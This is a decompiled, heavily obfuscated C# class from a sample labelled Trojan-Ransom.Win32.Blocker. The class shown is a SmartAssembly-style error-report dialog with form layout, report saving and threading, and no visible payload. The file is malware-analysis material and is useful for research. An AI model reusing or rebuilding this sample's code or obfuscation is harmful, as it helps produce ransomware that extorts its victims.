// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႷႭ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.Win32;
using My;
using SmartAssembly.Attributes;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Ⴈ
{
  [DesignerCategory("Code")]
  internal sealed class ႷႭ : Form
  {
    private PoweredByAttribute1.Ⴐ Ⴜ;
    private static readonly char[] ႥႥ;
    private static readonly char[] ႥႰ;
    private static readonly string[] ႥႣ;
    internal static ႷႭ.ႥႨ ႥႤ;
    private static readonly char[] ႥႠ;
    private static readonly char[] ႥႷ;
    private static readonly string[] ႥႼ;
    internal static ႷႭ.ႰႳ ႰႥ;

    private void Ⴗ()
    {
      int num1;
      Control[] controlArray;
      int num2;
      int num3;
      try
      {
        num1 = 50;
        while (true)
        {
          switch (num1)
          {
            case 0:
              ႷႠ.Ⴓ((Control) this.Ⴜ.ႥႭ, SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴍ((Control) this.Ⴜ.ႥႠ, 610, 524), 590, 632);
              num1 = 14;
              continue;
            case 1:
              this.Ⴜ.Ⴜ.Size = new Size(413, 240);
              this.Ⴜ.Ⴜ.TabIndex = 2;
              num1 = 43;
              continue;
            case 2:
              Ⴈ.Ⴍ.Ⴄ((Control) this.Ⴜ.Ⴈ, new Font(ႷႭ.ႥႭ(490613165, 8), 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0), 670, 689);
              num1 = 5;
              continue;
            case 3:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.Ⴈ, AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right, 289, 314);
              FeedbackControl.ႨႥ(this.Ⴜ.Ⴈ, FlatStyle.System, 246, 206);
              num1 = 2;
              continue;
            case 4:
              DESCryptoIndirector.Ⴐ((Control) this.Ⴜ.Ⴗ, new EventHandler(this.Ⴍ), 830, 848);
              num1 = 26;
              continue;
            case 5:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.Ⴈ, new Point(20, 124), 338, 377);
              num1 = 70;
              continue;
            case 6:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.ႥႠ, new Point(ႷႠ.Ⴃ((Control) this.Ⴜ.ႥႣ, 195, 132) - ႷႼ.Ⴃ((Control) this.Ⴜ.ႥႠ, 522, 570) - 6, 205), 82, 121);
              num1 = 25;
              continue;
            case 7:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.Ⴄ, new Point(ႷႠ.Ⴃ((Control) this.Ⴜ.Ⴗ, 462, 393) - ႷႼ.Ⴃ((Control) this.Ⴜ.Ⴄ, 481, 465) - 6, 205), 419, 392);
              num1 = 45;
              continue;
            case 8:
              SecurityExceptionEventArgs.ႠႥ((Control) this.Ⴜ.ႥႤ, 24, 144, 368, 16, 913, 896);
              num1 = 39;
              continue;
            case 9:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.ႰႰ, 14, 114, 9);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.ႰႰ, ႳႷ.Ⴗ(2059790894, 5), 439, 480);
              num1 = 23;
              continue;
            case 10:
              Control.ControlCollection controls1 = this.Ⴜ.Ⴓ.Controls;
              controlArray = new Control[8]
              {
                (Control) this.Ⴜ.ႰႰ,
                (Control) this.Ⴜ.Ⴐ,
                (Control) this.Ⴜ.Ⴈ,
                (Control) this.Ⴜ.Ⴗ,
                (Control) this.Ⴜ.Ⴄ,
                (Control) this.Ⴜ.Ⴀ,
                (Control) this.Ⴜ.Ⴍ,
                (Control) this.Ⴜ.ႥႼ
              };
              Control[] controls2 = controlArray;
              controls1.AddRange(controls2);
              num1 = 31;
              continue;
            case 11:
              DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႥႭ, false, 384, 508);
              DESCryptoIndirector.Ⴐ((Control) this.Ⴜ.ႥႭ, new EventHandler(this.ႰႤ), 73, 39);
              num1 = 27;
              continue;
            case 12:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.ႰႰ, AnchorStyles.Bottom | AnchorStyles.Right, 733, 710);
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.ႰႰ, FlatStyle.System, 509, 478);
              num1 = 16;
              continue;
            case 13:
            case 61:
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.Ⴀ, SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴃ(ႷႭ.ႥႭ(490613136, 8), (object) Ⴈ.Ⴀ.Ⴐ(1468303777, 7), 49, 99), 219, 140);
              num1 = 41;
              continue;
            case 14:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.ႥႭ, 5, 331, 304);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.ႥႭ, MyComputer.Ⴗ(834543480, 4), 115, 36);
              num1 = 11;
              continue;
            case 15:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.ႰႰ, new Point(ႷႠ.Ⴃ((Control) this.Ⴜ.Ⴄ, 491, 428) - ႷႼ.Ⴃ((Control) this.Ⴜ.ႰႰ, 45, 29) - 6, 205), 442, 401);
              num1 = 9;
              continue;
            case 16:
              ႷႠ.Ⴓ((Control) this.Ⴜ.ႰႰ, new Size(64, 24), 73, (int) sbyte.MaxValue);
              num1 = 15;
              continue;
            case 17:
              DESCryptoIndirector.Ⴐ((Control) this.Ⴜ.ႥႠ, new EventHandler(this.Ⴅ), 24, 118);
              num1 = 35;
              continue;
            case 18:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.Ⴀ, AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right, 111, 116);
              FeedbackControl.ႨႥ(this.Ⴜ.Ⴀ, FlatStyle.System, 682, 658);
              num1 = 20;
              continue;
            case 19:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.Ⴗ, AnchorStyles.Bottom | AnchorStyles.Right, 37, 62);
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.Ⴗ, FlatStyle.System, 766, 733);
              num1 = 56;
              continue;
            case 20:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.Ⴀ, new Point(20, 140), 95, 116);
              num1 = 64;
              continue;
            case 21:
              DESCryptoIndirector.Ⴐ((Control) this.Ⴜ.Ⴄ, new EventHandler(this.Ⴐ), 349, 307);
              num1 = 12;
              continue;
            case 22:
              SmartAssembly.SmartExceptionsCore.Win32.ႣႥ(this.Ⴜ.Ⴐ, new EventHandler(this.Ⴈ), 208, 159);
              num1 = 3;
              continue;
            case 23:
              DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႰႰ, false, 203, 183);
              DESCryptoIndirector.Ⴐ((Control) this.Ⴜ.ႰႰ, new EventHandler(this.ႰႰ), 656, 766);
              num1 = 18;
              continue;
            case 24:
              this.ClientSize = new Size(434, 488);
              this.ControlBox = false;
              Control.ControlCollection controls3 = this.Controls;
              controlArray = new Control[3]
              {
                (Control) this.Ⴜ.ႰႥ,
                (Control) this.Ⴜ.Ⴓ,
                (Control) this.Ⴜ.Ⴜ
              };
              Control[] controls4 = controlArray;
              controls3.AddRange(controls4);
              num1 = 51;
              continue;
            case 25:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.ႥႠ, 6, 107, 16);
              goto case 42;
            case 26:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.Ⴄ, AnchorStyles.Bottom | AnchorStyles.Right, 919, 908);
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.Ⴄ, FlatStyle.System, 558, 525);
              num1 = 69;
              continue;
            case 27:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.ႥႳ, AnchorStyles.Bottom | AnchorStyles.Right, 618, 625);
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.ႥႳ, FlatStyle.System, 808, 779);
              num1 = 65;
              continue;
            case 28:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.Ⴗ, new Point(400 - ႷႼ.Ⴃ((Control) this.Ⴜ.Ⴗ, 329, 377), 205), 461, 486);
              num1 = 38;
              continue;
            case 29:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.ႥႠ, AnchorStyles.Bottom | AnchorStyles.Right, 273, 266);
              UsageReportSender.Ⴄ((Control) this.Ⴜ.ႥႠ, false, 945, 901);
              num1 = 47;
              continue;
            case 30:
              ႷႠ.Ⴓ((Control) this.Ⴜ.Ⴐ, new Size(226, 16), 557, 539);
              num1 = 59;
              continue;
            case 31:
              this.Ⴜ.Ⴓ.Size = new Size(413, 240);
              this.Ⴜ.Ⴓ.TabIndex = 0;
              num1 = 37;
              continue;
            case 32:
              ႷႠ.Ⴓ((Control) this.Ⴜ.ႥႳ, SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴍ((Control) this.Ⴜ.ႥႠ, 235, 133), 141, 187);
              num1 = 48;
              continue;
            case 33:
              UnhandledExceptionHandlerWithUI.Ⴗ((Control) this, 241, 226);
              this.Ⴜ.ႥႼ.IconState = IconState.Error;
              num1 = 46;
              continue;
            case 34:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.ႥႣ, 7, 97, 26);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.ႥႣ, ႷႭ.ႥႳ(1491048563, 5), 899, 980);
              num1 = 55;
              continue;
            case 35:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.ႥႭ, AnchorStyles.Bottom | AnchorStyles.Right, 504, 483);
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.ႥႭ, FlatStyle.System, 589, 622);
              num1 = 49;
              continue;
            case 36:
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.Ⴐ, FlatStyle.System, 766, 733);
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.Ⴐ, new Point(22, 98), 1011, 984);
              num1 = 30;
              continue;
            case 37:
              Control.ControlCollection controls5 = this.Ⴜ.Ⴜ.Controls;
              controlArray = new Control[10]
              {
                (Control) this.Ⴜ.ႥႣ,
                (Control) this.Ⴜ.ႥႠ,
                (Control) this.Ⴜ.ႥႭ,
                (Control) this.Ⴜ.ႥႳ,
                (Control) this.Ⴜ.ႥႥ,
                (Control) this.Ⴜ.ႰႣ,
                (Control) this.Ⴜ.ႥႰ,
                (Control) this.Ⴜ.ႥႨ,
                (Control) this.Ⴜ.ႥႷ,
                (Control) this.Ⴜ.ႥႤ
              };
              Control[] controls6 = controlArray;
              controls5.AddRange(controls6);
              num1 = 1;
              continue;
            case 38:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.Ⴗ, 4, 687, 724);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.Ⴗ, MyComputer.Ⴗ(834543456, 8), 567, 608);
              num1 = 4;
              continue;
            case 39:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.ႰႥ, AnchorStyles.Bottom | AnchorStyles.Left, 122, 97);
              SecurityExceptionEventArgs.ႠႥ((Control) this.Ⴜ.ႰႥ, 20, 444, 120, 32, 214, 199);
              num1 = 10;
              continue;
            case 40:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.ႥႣ, new Point(400 - ႷႼ.Ⴃ((Control) this.Ⴜ.ႥႣ, 450, 498), 205), 658, 697);
              num1 = 34;
              continue;
            case 41:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.Ⴍ, AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right, 491, 496);
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.Ⴍ, new Point(20, 69), 783, 804);
              num1 = 52;
              continue;
            case 42:
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.ႥႠ, MyComputer.Ⴗ(834543481, 3), 440, 495);
              num1 = 17;
              continue;
            case 43:
              this.Ⴜ.Ⴜ.Visible = false;
              this.AutoScaleBaseSize = new Size(5, 13);
              num1 = 24;
              continue;
            case 44:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.ႥႣ, AnchorStyles.Bottom | AnchorStyles.Right, 394, 401);
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.ႥႣ, FlatStyle.System, 712, 747);
              num1 = 54;
              continue;
            case 45:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.Ⴄ, 3, 81, 42);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.Ⴄ, SimpleZip.Ⴓ(661403312, 5), 78, 25);
              num1 = 21;
              continue;
            case 46:
              this.Ⴜ.ႰႣ.IconState = IconState.Error;
              WaitSendingReportControl.Ⴄ((Control) this.Ⴜ.Ⴐ, AnchorStyles.Bottom | AnchorStyles.Left, 399, 404);
              num1 = 36;
              continue;
            case 47:
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴜ.ႥႠ, FlatStyle.System, 843, 872);
              ႷႠ.Ⴓ((Control) this.Ⴜ.ႥႠ, new Size(105, 24), 388, 434);
              num1 = 6;
              continue;
            case 48:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.ႥႳ, 5, 702, 709);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.ႥႳ, MyComputer.Ⴗ(834543473, 4), 243, 164);
              num1 = 63;
              continue;
            case 49:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.ႥႭ, \u003CPrivateImplementationDetails\u003E.Ⴓ((Control) this.Ⴜ.ႥႠ, 914, 989), 366, 325);
              num1 = 0;
              continue;
            case 51:
              this.FormBorderStyle = FormBorderStyle.FixedSingle;
              this.ShowInTaskbar = false;
              this.MinimizeBox = false;
              this.MaximizeBox = false;
              num1 = 62;
              continue;
            case 52:
              ႷႠ.Ⴓ((Control) this.Ⴜ.Ⴍ, new Size(381, 13), 402, 420);
              num1 = 44;
              continue;
            case 53:
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.Ⴈ, SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴃ(ႷႭ.ႥႭ(490613170, 0), (object) Ⴈ.Ⴀ.Ⴐ(1468303780, 2), 692, 742), 370, 293);
              num1 = 19;
              continue;
            case 54:
              ႷႠ.Ⴓ((Control) this.Ⴜ.ႥႣ, new Size(80, 24), 418, 404);
              num1 = 40;
              continue;
            case 55:
              DESCryptoIndirector.Ⴐ((Control) this.Ⴜ.ႥႣ, new EventHandler(this.Ⴃ), 570, 596);
              num1 = 29;
              continue;
            case 56:
              ႷႠ.Ⴓ((Control) this.Ⴜ.Ⴗ, new Size(75, 24), 654, 696);
              num1 = 28;
              continue;
            case 57:
              SecurityExceptionEventArgs.ႠႥ((Control) this.Ⴜ.ႥႨ, 24, 96, 368, 16, 342, 327);
              num1 = 68;
              continue;
            case 58:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.ႥႥ, new Point(87, 146), 863, 884);
              num1 = 67;
              continue;
            case 59:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴜ.Ⴐ, 13, 810, 849);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴜ.Ⴐ, Ⴈ.Ⴀ.Ⴐ(1468304125, 6), 617, 574);
              num1 = 22;
              continue;
            case 60:
              goto label_71;
            case 62:
              this.StartPosition = FormStartPosition.CenterScreen;
              this.Text = ႳႷ.Ⴗ(2059790408, 8);
              if (this.Text.Length == 0)
              {
                num1 = 60;
                continue;
              }
              goto label_72;
            case 63:
              DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႥႳ, false, 238, 146);
              DESCryptoIndirector.Ⴐ((Control) this.Ⴜ.ႥႳ, new EventHandler(this.Ⴄ), 190, 208);
              num1 = 58;
              continue;
            case 64:
            case 66:
              ႷႠ.Ⴓ((Control) this.Ⴜ.Ⴀ, new Size(381, 55), 122, 76);
              num1 = 61;
              continue;
            case 65:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴜ.ႥႳ, \u003CPrivateImplementationDetails\u003E.Ⴓ((Control) this.Ⴜ.ႥႠ, 17, 94), 563, 536);
              num1 = 32;
              continue;
            case 67:
              DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႥႥ, false, 731, 679);
              SecurityExceptionEventArgs.ႠႥ((Control) this.Ⴜ.ႥႰ, 24, 72, 368, 16, 384, 401);
              num1 = 57;
              continue;
            case 68:
              SecurityExceptionEventArgs.ႠႥ((Control) this.Ⴜ.ႥႷ, 24, 120, 368, 16, 377, 360);
              num1 = 8;
              continue;
            case 69:
              ႷႠ.Ⴓ((Control) this.Ⴜ.Ⴄ, new Size(105, 24), 406, 416);
              num1 = 7;
              continue;
            case 70:
              ႷႠ.Ⴓ((Control) this.Ⴜ.Ⴈ, new Size(381, 16), 28, 42);
              num1 = 53;
              continue;
            default:
              UnhandledExceptionHandlerWithUI.Ⴗ((Control) this.Ⴜ.Ⴓ, 83, 71);
              UnhandledExceptionHandlerWithUI.Ⴗ((Control) this.Ⴜ.Ⴜ, 339, 327);
              num1 = 33;
              continue;
          }
        }
label_71:
        this.Text = ႷႭ.ႥႭ(490612989, 2);
label_72:
        try
        {
          num2 = 4;
          switch (num2)
          {
            case 2:
              break;
            default:
              this.TopMost = true;
              break;
          }
        }
        catch
        {
        }
        num3 = 6;
        while (true)
        {
          switch (num3)
          {
            case 0:
              this.ResumeLayout(false);
              goto case 7;
            case 1:
              goto label_83;
            case 2:
              this.Size = new Size(419, 264);
              this.Ⴜ.Ⴜ.Dock = DockStyle.Fill;
              num3 = 1;
              continue;
            case 3:
              this.Ⴜ.ႥႳ.BringToFront();
              num3 = 2;
              continue;
            case 4:
              num3 = 0;
              continue;
            case 7:
              this.Ⴜ.ႥႭ.BringToFront();
              goto case 3;
            default:
              this.Ⴜ.Ⴓ.ResumeLayout(false);
              this.Ⴜ.Ⴜ.ResumeLayout(false);
              goto case 4;
          }
        }
label_83:
        this.Ⴜ.Ⴓ.Dock = DockStyle.Fill;
      }
      catch (Exception ex)
      {
        Control[] o1 = controlArray;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
        throw;
      }
    }

    private void Ⴄ(object Ⴄ, EventArgs Ⴐ)
    {
      int num;
      SaveFileDialog saveFileDialog;
      try
      {
        num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
              goto label_5;
            case 1:
              num = ႳႠ.Ⴈ((CommonDialog) saveFileDialog, 90, (int) sbyte.MaxValue) != DialogResult.OK ? 6 : 0;
              continue;
            case 2:
              goto label_6;
            case 4:
              goto label_8;
            case 5:
              goto label_9;
            case 6:
              goto label_10;
            case 7:
              ႳႠ.Ⴃ((FileDialog) saveFileDialog, ႷႭ.ႥႳ(1491048459, 7), 373, 320);
              FeedbackControl.ႨႨ((FileDialog) saveFileDialog, Ⴈ.Ⴀ.Ⴐ(1468303915, 6), 3, 89);
              num = 1;
              continue;
            default:
              saveFileDialog = new SaveFileDialog();
              MyComputer.Ⴅ((FileDialog) saveFileDialog, MyComputer.Ⴗ(834543477, 0), 533, 524);
              num = 7;
              continue;
          }
        }
label_6:
        return;
label_8:
        return;
label_9:
        return;
label_10:
        return;
label_5:
        this.Ⴜ.Ⴃ.SaveEncryptedReport(saveFileDialog.FileName);
        this.Close();
      }
      catch (Exception ex)
      {
        SaveFileDialog o1 = saveFileDialog;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num;
        object o4 = Ⴄ;
        EventArgs o5 = Ⴐ;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) this, o4, (object) o5);
        throw;
      }
    }

    private void Ⴐ(object Ⴐ, EventArgs Ⴈ)
    {
      int num1;
      try
      {
        try
        {
          num1 = 6;
          while (true)
          {
            switch (num1)
            {
              case 0:
                goto label_9;
              case 2:
              case 7:
                DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.Ⴜ, true, 812, 848);
                goto case 4;
              case 3:
                goto label_6;
              case 4:
                num1 = 5;
                continue;
              case 5:
                DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႰႥ, true, 363, 279);
                num1 = this.Ⴜ.Ⴃ == null ? 0 : 3;
                continue;
              default:
                DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.Ⴓ, false, 900, 1016);
                goto case 2;
            }
          }
label_6:
          this.Ⴀ(new ThreadStart(this.Ⴍ));
        }
        catch
        {
        }
label_9:
        switch (3)
        {
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num2;
        object o4 = Ⴐ;
        EventArgs o5 = Ⴈ;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) this, o4, (object) o5);
        throw;
      }
    }

    private void Ⴀ(ThreadStart Ⴅ)
    {
      Thread thread;
      try
      {
        thread = new Thread(Ⴅ);
        this.Ⴜ.Ⴅ = thread;
        UsageReportSender.Ⴜ(this.Ⴜ.Ⴅ, 442, 436);
      }
      catch (Exception ex)
      {
        Thread o1 = thread;
        ThreadStart o3 = Ⴅ;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
        throw;
      }
    }

    private void Ⴍ(object Ⴄ, EventArgs Ⴃ)
    {
      try
      {
        WaitSendingReportControl.ႥႷ((Form) this, 841, 892);
      }
      catch (Exception ex)
      {
        object o2 = Ⴄ;
        EventArgs o3 = Ⴃ;
        StackFrameHelper.CreateException3(ex, (object) this, o2, (object) o3);
        throw;
      }
    }

    private void Ⴃ(object Ⴅ, EventArgs Ⴍ)
    {
      int num;
      try
      {
        try
        {
          num = 5;
          while (true)
          {
            switch (num)
            {
              case 0:
              case 1:
                goto label_5;
              case 2:
              case 3:
              case 4:
                goto label_3;
              default:
                num = this.Ⴜ.Ⴅ == null ? 1 : 4;
                continue;
            }
          }
label_3:
          DESCryptoIndirector.Ⴄ(this.Ⴜ.Ⴅ, 977, 975);
        }
        catch
        {
        }
label_5:
        this.Close();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num;
        object o3 = Ⴅ;
        EventArgs o4 = Ⴍ;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) this, o3, (object) o4);
        throw;
      }
    }

    private void Ⴅ(object Ⴅ, EventArgs Ⴗ)
    {
      try
      {
        WaitSendingReportControl.ႥႷ((Form) this, 225, 212);
      }
      catch (Exception ex)
      {
        object o2 = Ⴅ;
        EventArgs o3 = Ⴗ;
        StackFrameHelper.CreateException3(ex, (object) this, o2, (object) o3);
        throw;
      }
    }

    private void Ⴈ(object Ⴃ, EventArgs Ⴅ)
    {
      try
      {
        this.Ⴜ.Ⴃ.TryToContinue = ႳႷ.ႤႤ(this.Ⴜ.Ⴐ, 783, 847);
      }
      catch (Exception ex)
      {
        object o2 = Ⴃ;
        EventArgs o3 = Ⴅ;
        StackFrameHelper.CreateException3(ex, (object) this, o2, (object) o3);
        throw;
      }
    }

    private void Ⴀ(object Ⴓ, SendingReportFeedbackEventArgs Ⴅ)
    {
      object[] objArray1;
      try
      {
        try
        {
          SendingReportFeedbackEventHandler method = new SendingReportFeedbackEventHandler(this.Ⴗ);
          objArray1 = new object[2]{ Ⴓ, (object) Ⴅ };
          object[] objArray2 = objArray1;
          this.Invoke((Delegate) method, objArray2);
        }
        catch (InvalidOperationException ex)
        {
        }
      }
      catch (Exception ex)
      {
        object[] o1 = objArray1;
        object o3 = Ⴓ;
        SendingReportFeedbackEventArgs o4 = Ⴅ;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) this, o3, (object) o4);
        throw;
      }
    }

    private void Ⴓ(object Ⴓ, EventArgs Ⴅ)
    {
      object[] objArray1;
      try
      {
        try
        {
          EventHandler method = new EventHandler(this.Ⴜ);
          objArray1 = new object[2]{ Ⴓ, (object) Ⴅ };
          object[] objArray2 = objArray1;
          this.Invoke((Delegate) method, objArray2);
        }
        catch (InvalidOperationException ex)
        {
        }
      }
      catch (Exception ex)
      {
        object[] o1 = objArray1;
        object o3 = Ⴓ;
        EventArgs o4 = Ⴅ;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) this, o3, (object) o4);
        throw;
      }
    }

    protected override void OnClosing(CancelEventArgs Ⴗ)
    {
      int num;
      try
      {
        num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 4:
            case 5:
            case 6:
              goto label_4;
            case 1:
              num = !Ⴈ.Ⴅ.ႥႣ(this.Ⴜ.Ⴅ, 236, 239) ? 2 : 0;
              continue;
            case 2:
              goto label_5;
            default:
              num = this.Ⴜ.Ⴅ == null ? 2 : 1;
              continue;
          }
        }
label_4:
        DESCryptoIndirector.Ⴄ(this.Ⴜ.Ⴅ, 274, 268);
label_5:
        base.OnClosing(Ⴗ);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num;
        CancelEventArgs o3 = Ⴗ;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
        throw;
      }
    }

    private void Ⴗ(object Ⴗ, SendingReportFeedbackEventArgs Ⴄ)
    {
      int num1;
      Button button1;
      SendingReportStep step;
      int num2;
      try
      {
        num1 = 2;
        while (true)
        {
          Button button2;
          switch (num1)
          {
            case 0:
            case 6:
              button2 = this.Ⴜ.ႥႳ;
              break;
            case 1:
              button2 = this.Ⴜ.ႥႭ;
              break;
            case 3:
              goto label_29;
            case 4:
            case 7:
              num1 = SendingReportFeedbackEventArgs1.Ⴜ(DoNotObfuscateTypeAttribute.Ⴈ(135, 204), 862, 783) == ApartmentState.STA ? 6 : 1;
              continue;
            case 5:
              goto label_30;
            default:
              num1 = !this.Ⴜ.ႰႨ ? 1 : 4;
              continue;
          }
          button1 = button2;
          step = Ⴄ.Step;
          switch (step)
          {
            case SendingReportStep.PreparingReport:
              goto label_10;
            case SendingReportStep.ConnectingToServer:
              goto label_14;
            case SendingReportStep.Transfering:
              goto label_18;
            case SendingReportStep.Finished:
              goto label_23;
            default:
              num1 = 5;
              continue;
          }
        }
label_29:
        return;
label_30:
        return;
label_8:
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_16;
            case 1:
              goto label_14;
            case 2:
              goto label_27;
            case 3:
              goto label_26;
            case 5:
              goto label_17;
            case 6:
              goto label_10;
            case 7:
              goto label_12;
            case 8:
              this.Ⴜ.ႥႤ.Stop();
              goto case 15;
            case 9:
              goto label_22;
            case 10:
              this.Ⴜ.ႥႨ.Stop();
              this.Ⴜ.ႥႷ.Start();
              num2 = 9;
              continue;
            case 11:
              DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႥႥ, false, (int) byte.MaxValue, 131);
              this.Ⴜ.ႥႷ.Stop(Ⴄ.ErrorMessage);
              num2 = 18;
              continue;
            case 12:
              this.Ⴜ.ႥႨ.Stop(Ⴄ.ErrorMessage);
              DoNotPruneTypeAttribute.Ⴍ((Control) button1, true, 550, 602);
              num2 = 0;
              continue;
            case 13:
              goto label_18;
            case 14:
            case 17:
              goto label_23;
            case 15:
              this.Ⴜ.ႥႠ.Enabled = true;
              num2 = 3;
              continue;
            case 16:
              goto label_13;
            case 18:
              goto label_20;
            case 19:
              this.Ⴜ.ႥႰ.Stop(Ⴄ.ErrorMessage);
              DoNotPruneTypeAttribute.Ⴍ((Control) button1, true, 293, 345);
              num2 = 7;
              continue;
            default:
              goto label_9;
          }
        }
label_9:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.Ⴗ);
        return;
label_12:
        PoweredByAttribute1.Ⴈ((Control) button1, 589, 583);
        return;
label_13:
        this.Ⴜ.ႥႰ.Start();
        return;
label_16:
        PoweredByAttribute1.Ⴈ((Control) button1, 236, 230);
        return;
label_17:
        this.Ⴜ.ႥႰ.Stop();
        this.Ⴜ.ႥႨ.Start();
        return;
label_20:
        DoNotPruneTypeAttribute.Ⴍ((Control) button1, true, 1010, 910);
        PoweredByAttribute1.Ⴈ((Control) button1, 606, 596);
        return;
label_22:
        DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴜ.ႥႥ, true, 156, 224);
        return;
label_26:
        this.Ⴜ.ႥႠ.Focus();
label_27:
        this.Ⴜ.ႥႣ.Enabled = false;
        return;
label_10:
        num2 = !Ⴄ.Failed ? 16 : 19;
        goto label_8;
label_14:
        num2 = !Ⴄ.Failed ? 5 : 12;
        goto label_8;
label_18:
        num2 = !Ⴄ.Failed ? 10 : 11;
        goto label_8;
label_23:
        this.Ⴜ.ႥႥ.Visible = false;
        this.Ⴜ.ႥႷ.Stop();
        num2 = 8;
        goto label_8;
      }
      catch (Exception ex)
      {
        Button o1 = button1;
        // ISSUE: variable of a boxed type
